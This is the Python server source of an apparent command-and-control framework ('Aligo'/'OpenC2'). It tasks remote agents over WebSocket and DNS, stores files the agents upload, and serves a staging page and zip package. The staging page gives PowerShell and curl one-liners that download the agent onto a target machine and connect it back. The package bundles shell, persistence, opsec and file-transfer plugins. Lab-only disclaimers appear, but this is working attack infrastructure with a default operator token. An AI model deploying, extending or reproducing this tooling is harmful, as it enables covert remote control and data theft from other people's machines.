"""
main.py — Entry point del servidor C2 Aligo.

Levanta FastAPI con:
  /ws          → WebSocket channel (agentes)
  /api/agents  → REST para el operador (listar, enviar tasks)
  /api/stream  → SSE para el dashboard (eventos en tiempo real)
  /health      → keepalive

Pub/sub interno: AgentManager.pubsub emite eventos que el SSE endpoint
consume y re-emite al dashboard sin polling.
"""

from __future__ import annotations

import asyncio
import io
import json
import logging
import os
import secrets
import signal
import time
import uuid
import zipfile
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
from pathlib import Path

from dotenv import load_dotenv
load_dotenv()  # MUST run before any core imports that read env vars at module level

import jwt as _pyjwt
from fastapi import FastAPI, Header, HTTPException, Query, Request, WebSocket
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, StreamingResponse
from pydantic import BaseModel

from core import crypto
from core.agent_manager import AgentManager
from core.audit_trail import get_trail
from core.observability import get_metrics
from core.solana_anchor import wallet_info as _solana_wallet_info, get_signatures as _solana_sigs
from core.channels.dns import DNSChannel
from core.channels.websocket import WebSocketChannel
from core.protocol import Message, MessageType, TaskPayload

logging.basicConfig(
    level=os.getenv("C2_LOG_LEVEL", "INFO"),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("c2.server")

# ---------------------------------------------------------------------------
# Globals
# ---------------------------------------------------------------------------

OPERATOR_TOKEN    = os.getenv("OPERATOR_TOKEN", "openc2-dev-token")
DASHBOARD_ORIGIN  = os.getenv("DASHBOARD_ORIGIN", "http://localhost:5173")
PRIV_PATH         = Path(os.getenv("SERVER_PRIVATE_KEY_PATH", "keys/server_priv.pem"))
PUB_PATH          = Path(os.getenv("SERVER_PUBLIC_KEY_PATH", "keys/server_pub.pem"))
DNS_PORT          = int(os.getenv("C2_DNS_PORT", "5353"))
JWT_SECRET        = os.getenv("JWT_SECRET", secrets.token_hex(32))
JWT_ALGORITHM     = "HS256"
JWT_EXPIRE_HOURS  = int(os.getenv("JWT_EXPIRE_HOURS", "24"))

# Almacen en memoria de archivos subidos por agentes
_uploaded_files: dict[str, dict] = {}   # filename -> {agent_id, data_b64, sha256, size, ts}

manager = AgentManager()
server_priv = crypto.load_or_create_keypair(PRIV_PATH, PUB_PATH)
server_pub_pem = crypto.export_public_key_pem(server_priv.public_key())
ws_channel = WebSocketChannel(manager, server_priv, server_pub_pem)
dns_channel = DNSChannel(manager, port=DNS_PORT)


# ---------------------------------------------------------------------------
# Lifespan
# ---------------------------------------------------------------------------

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Arrancar canal DNS
    try:
        await dns_channel.start()
    except PermissionError:
        logger.warning("DNS channel: no se pudo abrir UDP/%d (sin permisos). Continua sin DNS.", DNS_PORT)
    except Exception as exc:
        logger.warning("DNS channel: %s", exc)

    # Tarea de limpieza de agentes muertos
    async def reaper():
        while True:
            await asyncio.sleep(30)
            n = await manager.reap_dead(ttl_seconds=60)
            if n:
                logger.info("Reaped %d dead agents", n)

    # Push de metricas cada 5s a todos los suscriptores SSE
    async def metrics_pusher():
        while True:
            await asyncio.sleep(5)
            snap = get_metrics().snapshot()
            await manager.pubsub.publish("metrics.update", snap)

    reap_task    = asyncio.create_task(reaper())
    metrics_task = asyncio.create_task(metrics_pusher())

    # SIGTERM/SIGINT handler: persiste colas pendientes a SQLite
    loop = asyncio.get_event_loop()
    async def _graceful_shutdown():
        logger.info("Senial de apagado recibida — persistiendo colas a SQLite...")
        saved = await manager.flush_to_db()
        logger.info("Cola persistida: %d tareas guardadas", saved)

    def _signal_handler():
        asyncio.create_task(_graceful_shutdown())

    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            loop.add_signal_handler(sig, _signal_handler)
        except (NotImplementedError, RuntimeError):
            pass  # Windows no soporta add_signal_handler para todos los signals

    logger.info("OpenC2 v1.0 server listo — JWT expira en %dh — pub key: %s...",
                JWT_EXPIRE_HOURS, server_pub_pem[27:67].decode())
    yield
    reap_task.cancel()
    metrics_task.cancel()
    await dns_channel.stop()
    await manager.flush_to_db()


app = FastAPI(title="OpenC2", version="1.0.0", lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=[DASHBOARD_ORIGIN, "http://localhost:3000"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


# ---------------------------------------------------------------------------
# Auth — JWT + legacy static token (compatibilidad hacia atras)
# ---------------------------------------------------------------------------

def _verify_token(token: str) -> bool:
    """Acepta JWT valido O el token estatico legacy."""
    if not token:
        return False
    # Intento 1: JWT
    try:
        _pyjwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        return True
    except _pyjwt.InvalidTokenError:
        pass
    # Intento 2: token estatico (retrocompatibilidad)
    return token == OPERATOR_TOKEN


def require_operator(x_operator_token: str = Header(default=""), token: str = Query(default="")):
    t = x_operator_token or token
    if not _verify_token(t):
        raise HTTPException(status_code=401, detail="Token invalido o expirado")


class TokenRequest(BaseModel):
    password: str


@app.post("/api/auth/token")
async def issue_token(body: TokenRequest):
    """Emite un JWT con expiracion. Envia la contrasena del operador para obtenerlo."""
    if body.password != OPERATOR_TOKEN:
        raise HTTPException(status_code=401, detail="Contrasena incorrecta")
    exp = datetime.now(tz=timezone.utc) + timedelta(hours=JWT_EXPIRE_HOURS)
    token = _pyjwt.encode(
        {"sub": "operator", "exp": exp, "iat": datetime.now(tz=timezone.utc)},
        JWT_SECRET,
        algorithm=JWT_ALGORITHM,
    )
    return {
        "token": token,
        "token_type": "Bearer",
        "expires_in": JWT_EXPIRE_HOURS * 3600,
        "expires_at": exp.isoformat(),
    }


@app.get("/api/auth/verify")
async def verify_token(x_operator_token: str = Header(default=""), token: str = Query(default="")):
    """Verifica si el token actual es valido."""
    t = x_operator_token or token
    if _verify_token(t):
        return {"valid": True}
    raise HTTPException(status_code=401, detail="Token invalido o expirado")


# ---------------------------------------------------------------------------
# WebSocket endpoint (agentes)
# ---------------------------------------------------------------------------

@app.websocket("/ws")
async def ws_endpoint(websocket: WebSocket):
    await ws_channel.serve(websocket)


# ---------------------------------------------------------------------------
# REST API del operador
# ---------------------------------------------------------------------------

@app.get("/health")
async def health():
    return {"status": "ok", "agents": len(manager.all())}


@app.get("/api/agents")
async def list_agents(x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    return [a.public() for a in manager.all()]


@app.get("/api/agents/{agent_id}")
async def get_agent(agent_id: str, x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    state = manager.get(agent_id)
    if not state:
        raise HTTPException(status_code=404, detail="Agent not found")
    return state.public()


class TaskRequest(BaseModel):
    plugin: str
    action: str
    args: dict = {}
    timeout: float = 30.0


@app.post("/api/agents/{agent_id}/task")
async def send_task(agent_id: str, body: TaskRequest, x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    state = manager.get(agent_id)
    if not state:
        raise HTTPException(status_code=404, detail="Agent not found")
    if not state.connected:
        raise HTTPException(status_code=409, detail="Agent not connected")

    task = TaskPayload(plugin=body.plugin, action=body.action, args=body.args, timeout=body.timeout)
    msg = Message(
        type=MessageType.TASK,
        agent_id=agent_id,
        payload=task.model_dump(),
    )
    # Firmar el mensaje con la session key del agente
    body_bytes = msg.to_bytes_for_signature()
    msg.sig = crypto.sign(state.session_key, body_bytes)

    ok = await manager.enqueue_task(agent_id, msg)
    if not ok:
        raise HTTPException(status_code=503, detail="Could not enqueue task")
    return {"task_id": task.task_id, "status": "queued"}


# ---------------------------------------------------------------------------
# SSE — Dashboard en tiempo real (pub/sub)
# ---------------------------------------------------------------------------

@app.get("/api/stream")
async def event_stream(
    x_operator_token: str = Header(default=""),
    token: str = Query(default=""),
):
    # EventSource (browser) no puede enviar headers → acepta token como query param
    effective_token = x_operator_token or token
    if effective_token != OPERATOR_TOKEN:
        raise HTTPException(status_code=401, detail="Invalid operator token")

    async def generator():
        q = await manager.pubsub.subscribe("*")
        try:
            while True:
                try:
                    event = await asyncio.wait_for(q.get(), timeout=25)
                    data = json.dumps(event)
                    yield f"data: {data}\n\n"
                except asyncio.TimeoutError:
                    yield ": keepalive\n\n"
        finally:
            await manager.pubsub.unsubscribe("*", q)

    return StreamingResponse(
        generator(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


# ---------------------------------------------------------------------------
# Server pub key (para agentes que lo necesiten vía HTTPS)
# ---------------------------------------------------------------------------

@app.get("/metrics")
async def get_metrics_endpoint(x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    return get_metrics().snapshot()


@app.get("/audit")
async def get_audit(
    limit: int = 50,
    x_operator_token: str = Header(default=""),
):
    require_operator(x_operator_token)
    trail = get_trail()
    sigs = _solana_sigs()
    blocks = []
    for b in trail.last(limit):
        d = b.to_dict()
        if b.block_id in sigs:
            d["solana_sig"] = sigs[b.block_id]
            d["solana_explorer"] = f"https://explorer.solana.com/tx/{sigs[b.block_id]}?cluster=devnet"
        blocks.append(d)
    integrity = trail.verify_chain()
    return {"integrity": integrity, "blocks": blocks}


@app.get("/api/solana")
async def get_solana(x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    info = _solana_wallet_info()
    sigs = _solana_sigs()
    info["anchored_blocks"] = len(sigs)
    info["recent_signatures"] = [
        {
            "block_id": bid,
            "sig": sig,
            "explorer": f"https://explorer.solana.com/tx/{sig}?cluster=devnet",
        }
        for bid, sig in sorted(sigs.items(), reverse=True)[:10]
    ]
    return info


@app.get("/api/pubkey")
async def get_pubkey():
    return {"pem": server_pub_pem.decode("ascii")}


# ---------------------------------------------------------------------------
# Snapshot store (in-memory, per agent)
# ---------------------------------------------------------------------------

_snapshots: dict[str, list[dict]] = {}


# ---------------------------------------------------------------------------
# Doctor — diagnostic endpoint
# ---------------------------------------------------------------------------

@app.get("/api/doctor")
async def doctor_endpoint(x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)

    checks: dict = {}

    checks["crypto"] = {
        "rsa_keys_exist": PRIV_PATH.exists() and PUB_PATH.exists(),
        "pub_fingerprint": server_pub_pem[27:67].decode() if server_pub_pem else None,
        "encryption": "AES-256-GCM",
        "key_exchange": "RSA-OAEP",
        "signing": "HMAC-SHA256",
        "status": "OK" if PRIV_PATH.exists() else "ERROR",
    }

    agents = manager.all()
    connected = [a for a in agents if a.connected]
    checks["agents"] = {
        "total": len(agents),
        "connected": len(connected),
        "disconnected": len(agents) - len(connected),
        "details": [
            {
                "id": a.agent_id[:8],
                "host": a.hostname,
                "os": a.os,
                "plugins": a.plugins or a.capabilities,
                "connected": a.connected,
                "last_seen_ago": f"{time.time() - a.last_seen:.0f}s",
            }
            for a in agents
        ],
    }

    checks["channels"] = {
        "websocket": {"status": "OK", "endpoint": "/ws"},
        "dns": {
            "status": "OK" if dns_channel._transport else "INACTIVE",
            "port": DNS_PORT,
        },
    }

    trail = get_trail()
    integrity = trail.verify_chain()
    checks["audit_trail"] = {
        "blocks": len(trail),
        "integrity": integrity,
        "file": str(trail.path),
    }

    checks["solana"] = _solana_wallet_info()

    all_plugins = set()
    for a in agents:
        all_plugins.update(a.plugins or a.capabilities)
    checks["plugins_available"] = sorted(all_plugins) if all_plugins else ["none connected"]

    checks["metrics"] = get_metrics().snapshot()

    issues = []
    if not checks["crypto"]["rsa_keys_exist"]:
        issues.append("RSA keys missing")
    if not integrity.get("valid"):
        issues.append(f"Audit chain corrupt: {integrity.get('corrupt_blocks')}")
    if len(connected) == 0:
        issues.append("No agents connected")
    if not checks["solana"].get("enabled"):
        issues.append("Solana anchoring disabled")

    return {
        "status": "HEALTHY" if not issues else "DEGRADED",
        "issues": issues,
        "checks": checks,
        "timestamp": time.time(),
        "server_version": "OpenC2/1.0.0",
    }


# ---------------------------------------------------------------------------
# Snapshot + diff
# ---------------------------------------------------------------------------

@app.post("/api/agents/{agent_id}/snapshot")
async def take_snapshot(agent_id: str, x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    state = manager.get(agent_id)
    if not state:
        raise HTTPException(404, "Agent not found")
    snap = {**state.public(), "snapshot_ts": time.time()}
    _snapshots.setdefault(agent_id, []).append(snap)
    idx = len(_snapshots[agent_id]) - 1
    await manager.pubsub.publish("agents.snapshot", {"agent_id": agent_id, "snapshot_id": idx})
    return {"snapshot_id": idx, "total_snapshots": idx + 1, "snapshot": snap}


@app.get("/api/agents/{agent_id}/snapshot/diff")
async def snapshot_diff(agent_id: str, x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    snaps = _snapshots.get(agent_id, [])
    if len(snaps) < 2:
        raise HTTPException(400, "Need at least 2 snapshots to diff")
    before, after = snaps[-2], snaps[-1]
    diff = {}
    all_keys = set(list(before.keys()) + list(after.keys()))
    for key in all_keys:
        if key == "snapshot_ts":
            continue
        bv, av = before.get(key), after.get(key)
        if bv != av:
            diff[key] = {"before": bv, "after": av}
    return {
        "before_ts": before["snapshot_ts"],
        "after_ts": after["snapshot_ts"],
        "elapsed_s": round(after["snapshot_ts"] - before["snapshot_ts"], 1),
        "changes": diff,
        "changed_fields": list(diff.keys()),
        "total_snapshots": len(snaps),
    }


# ---------------------------------------------------------------------------
# Workflow — execute multiple tasks sequentially
# ---------------------------------------------------------------------------

class WorkflowStep(BaseModel):
    plugin: str
    action: str
    args: dict = {}
    timeout: float = 30.0


class WorkflowRequest(BaseModel):
    steps: list[WorkflowStep]


@app.post("/api/agents/{agent_id}/workflow")
async def run_workflow(
    agent_id: str,
    body: WorkflowRequest,
    x_operator_token: str = Header(default=""),
):
    require_operator(x_operator_token)
    state = manager.get(agent_id)
    if not state:
        raise HTTPException(404, "Agent not found")
    if not state.connected:
        raise HTTPException(409, "Agent not connected")

    wf_id = str(uuid.uuid4())
    results = []
    for i, step in enumerate(body.steps):
        task = TaskPayload(
            plugin=step.plugin, action=step.action,
            args=step.args, timeout=step.timeout,
        )
        msg = Message(
            type=MessageType.TASK,
            agent_id=agent_id,
            payload=task.model_dump(),
        )
        body_bytes = msg.to_bytes_for_signature()
        msg.sig = crypto.sign(state.session_key, body_bytes)
        ok = await manager.enqueue_task(agent_id, msg)
        results.append({
            "step": i,
            "task_id": task.task_id,
            "plugin": step.plugin,
            "action": step.action,
            "queued": ok,
        })

    await manager.pubsub.publish("agents.workflow", {
        "agent_id": agent_id, "workflow_id": wf_id, "steps": len(body.steps),
    })
    return {"workflow_id": wf_id, "steps": results, "total": len(body.steps)}


# ---------------------------------------------------------------------------
# File transfer — almacen de archivos subidos por agentes
# ---------------------------------------------------------------------------

class FileUploadNotify(BaseModel):
    filename: str
    content_b64: str
    sha256: str
    size_bytes: int


@app.post("/api/agents/{agent_id}/files")
async def receive_uploaded_file(
    agent_id: str,
    body: FileUploadNotify,
    x_operator_token: str = Header(default=""),
):
    """El operador (o un resultado de filetransfer) registra un archivo subido."""
    require_operator(x_operator_token)
    state = manager.get(agent_id)
    if not state:
        raise HTTPException(404, "Agent not found")
    key = f"{agent_id}/{body.filename}"
    _uploaded_files[key] = {
        "agent_id": agent_id,
        "hostname": state.hostname,
        "filename": body.filename,
        "content_b64": body.content_b64,
        "sha256": body.sha256,
        "size_bytes": body.size_bytes,
        "uploaded_at": time.time(),
    }
    await manager.pubsub.publish("agents.file_upload", {
        "agent_id": agent_id, "filename": body.filename, "size": body.size_bytes,
    })
    return {"stored": key, "sha256": body.sha256}


@app.get("/api/agents/{agent_id}/files")
async def list_uploaded_files(agent_id: str, x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    prefix = f"{agent_id}/"
    files = [
        {k: v for k, v in meta.items() if k != "content_b64"}
        for key, meta in _uploaded_files.items()
        if key.startswith(prefix)
    ]
    return {"agent_id": agent_id, "files": files, "count": len(files)}


@app.get("/api/agents/{agent_id}/files/{filename}")
async def download_uploaded_file(
    agent_id: str, filename: str, x_operator_token: str = Header(default=""),
):
    require_operator(x_operator_token)
    key = f"{agent_id}/{filename}"
    meta = _uploaded_files.get(key)
    if not meta:
        raise HTTPException(404, f"Archivo '{filename}' no encontrado para agente {agent_id}")
    import base64
    raw = base64.b64decode(meta["content_b64"])
    return StreamingResponse(
        iter([raw]),
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


# ---------------------------------------------------------------------------
# Audit verify — detailed chain verification
# ---------------------------------------------------------------------------

@app.get("/api/audit/verify")
async def audit_verify(x_operator_token: str = Header(default="")):
    require_operator(x_operator_token)
    trail = get_trail()
    integrity = trail.verify_chain()
    sigs = _solana_sigs()

    anchored = sum(1 for b in trail.last(9999) if b.block_id in sigs)
    return {
        "chain_valid": integrity["valid"],
        "total_blocks": integrity["total"],
        "corrupt_blocks": integrity.get("corrupt_blocks", []),
        "solana_anchored": anchored,
        "solana_pending": integrity["total"] - anchored,
        "last_block": trail.last(1)[0].to_dict() if len(trail) > 0 else None,
        "verification_ts": time.time(),
    }


# ---------------------------------------------------------------------------
# Stage — payload delivery for remote testing
# ---------------------------------------------------------------------------

_PROJECT_ROOT = Path(__file__).parent.parent


@app.get("/api/stage")
async def stage_page(request: Request, label: str = Query(default="")):
    host = request.headers.get("host", "localhost:8000")
    scheme = "https" if request.url.scheme == "https" else "http"
    base_url = f"{scheme}://{host}"
    ws_url = f"ws://{host}/ws"
    label_arg = f" --label {label}" if label else ""
    label_env_bat = f"set AGENT_LABEL={label}\r\n" if label else ""
    label_env_sh = f"export AGENT_LABEL={label}\n" if label else ""
    label_badge = (
        f'<span style="background:#4c1d95;color:#c4b5fd;padding:2px 8px;border-radius:4px;font-size:11px;margin-left:8px">{label}</span>'
        if label else ""
    )

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>OpenC2 Connect</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',sans-serif;background:#0a0e1a;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center}}
.card{{background:#111827;border:1px solid #1f2937;border-radius:12px;padding:40px;max-width:620px;width:100%}}
h1{{color:#22d3ee;font-size:24px;margin-bottom:8px;display:flex;align-items:center;gap:8px}}
.sub{{color:#6b7280;font-size:14px;margin-bottom:24px}}
.step{{background:#1e293b;border-radius:8px;padding:16px;margin-bottom:12px}}
.step-num{{color:#22d3ee;font-weight:bold;font-size:12px;text-transform:uppercase;margin-bottom:4px}}
code{{background:#0f172a;color:#a5f3fc;padding:8px 12px;border-radius:6px;display:block;font-size:12px;margin-top:8px;word-break:break-all;cursor:pointer}}
code:hover{{background:#1e293b}}
.btn{{display:inline-block;background:#0891b2;color:#fff;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:bold;margin-top:16px;transition:background .2s}}
.btn:hover{{background:#06b6d4}}
.warn{{color:#fbbf24;font-size:12px;margin-top:16px}}
</style>
</head>
<body>
<div class="card">
<h1>OpenC2 v1.0 — Agent Deploy {label_badge}</h1>
<p class="sub">OpenC2 v1.0 — Authorized security testing environment</p>

<div class="step">
<div class="step-num">Step 1 — Download Agent Package</div>
<p style="color:#9ca3af;font-size:13px">Download and extract the agent on the target machine</p>
<a href="{base_url}/api/stage/package" class="btn">Download Agent Package (.zip)</a>
</div>

<div class="step">
<div class="step-num">Step 2 — Install Dependencies</div>
<code onclick="navigator.clipboard.writeText(this.textContent)">pip install websockets cryptography psutil</code>
</div>

<div class="step">
<div class="step-num">Step 3 — Connect</div>
<code onclick="navigator.clipboard.writeText(this.textContent)">python connect.py --server {ws_url}{label_arg}</code>
</div>

<div class="step">
<div class="step-num">PowerShell one-liner</div>
<code onclick="navigator.clipboard.writeText(this.textContent)">powershell -c "Invoke-WebRequest '{base_url}/api/stage/package' -OutFile agent.zip; Expand-Archive agent.zip -Force; cd aligo-agent; pip install -r requirements.txt; python connect.py --server {ws_url}{label_arg}"</code>
</div>

<div class="step">
<div class="step-num">Bash one-liner</div>
<code onclick="navigator.clipboard.writeText(this.textContent)">curl -sO {base_url}/api/stage/package && unzip -o aligo-agent.zip && cd aligo-agent && pip3 install -r requirements.txt && python3 connect.py --server {ws_url}{label_arg}</code>
</div>

<div class="step">
<div class="step-num">Multi-agent — separate label per instance</div>
<code onclick="navigator.clipboard.writeText(this.textContent)"># Agente 1:  python connect.py --server {ws_url} --label agent-1
# Agente 2:  python connect.py --server {ws_url} --label agent-2
# O via env:  set AGENT_LABEL=agent-1 && python connect.py --server {ws_url}</code>
</div>

<p class="warn">Lab environment only. Requires authorization for use.</p>
</div>
</body>
</html>"""
    return HTMLResponse(html)


@app.get("/api/stage/package")
async def stage_package(request: Request, label: str = Query(default="")):
    host = request.headers.get("host", "localhost:8000")
    ws_url = f"ws://{host}/ws"
    label_arg = f" --label {label}" if label else ""

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        agent_dir = _PROJECT_ROOT / "agent"
        core_dir = _PROJECT_ROOT / "server" / "core"

        # Agent files
        for fpath in [
            agent_dir / "agent.py",
            agent_dir / "plugins" / "__init__.py",
            agent_dir / "plugins" / "base.py",
            agent_dir / "plugins" / "shell.py",
            agent_dir / "plugins" / "sysinfo.py",
            agent_dir / "plugins" / "opsec.py",
            agent_dir / "plugins" / "persist.py",
            agent_dir / "plugins" / "filetransfer.py",
        ]:
            if fpath.exists():
                arcname = f"openc2-agent/{fpath.relative_to(agent_dir)}"
                zf.write(fpath, arcname)

        # Core modules (crypto + protocol)
        for fpath in [
            core_dir / "__init__.py",
            core_dir / "crypto.py",
            core_dir / "protocol.py",
        ]:
            if fpath.exists():
                arcname = f"openc2-agent/core/{fpath.name}"
                zf.write(fpath, arcname)

        # Connect script (uses local core/)
        connect_py = f'''#!/usr/bin/env python3
"""C2 Aligo Agent — Standalone Connector"""
import argparse, asyncio, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
os.environ.setdefault("AGENT_LOG_LEVEL", "INFO")
from agent import Agent

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Aligo Agent Connector")
    parser.add_argument("--server", default="{ws_url}")
    parser.add_argument("--label", default=os.getenv("AGENT_LABEL", ""),
                        help="Etiqueta para identificar este agente (multi-agente en el mismo host)")
    args = parser.parse_args()
    asyncio.run(Agent(args.server, label=args.label).run())
'''
        zf.writestr("openc2-agent/connect.py", connect_py)

        # Modified agent.py path resolution
        if (agent_dir / "agent.py").exists():
            agent_code = (agent_dir / "agent.py").read_text(encoding="utf-8")
            # Replace the server path hack with local core/ resolution
            agent_code = agent_code.replace(
                '_root = Path(__file__).parent.parent / "server"\n'
                'sys.path.insert(0, str(_root))',
                '_root = Path(__file__).parent\n'
                'sys.path.insert(0, str(_root))',
            )
            zf.writestr("openc2-agent/agent.py", agent_code)

        # Requirements
        zf.writestr("openc2-agent/requirements.txt",
                     "websockets>=13.1\\ncryptography>=43.0\\npsutil\\n")

        # Run scripts (soportan --label para multi-agente)
        label_bat = f"set AGENT_LABEL={label}\\r\\n" if label else ""
        label_sh  = f"export AGENT_LABEL={label}\\n" if label else ""
        zf.writestr(
            "openc2-agent/run.bat",
            f'@echo off\\ncd /d "%~dp0"\\n{label_bat}pip install -r requirements.txt\\n'
            f'python connect.py --server {ws_url}{label_arg}\\npause\\n',
        )
        zf.writestr(
            "openc2-agent/run.sh",
            f'#!/bin/bash\\ncd "$(dirname "$0")"\\n{label_sh}'
            f'pip3 install -r requirements.txt\\npython3 connect.py --server {ws_url}{label_arg}\\n',
        )

    buf.seek(0)
    return StreamingResponse(
        buf,
        media_type="application/zip",
        headers={"Content-Disposition": "attachment; filename=openc2-agent.zip"},
    )


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "main:app",
        host=os.getenv("C2_HOST", "0.0.0.0"),
        port=int(os.getenv("C2_PORT", "8000")),
        reload=False,
        log_level=os.getenv("C2_LOG_LEVEL", "info").lower(),
    )
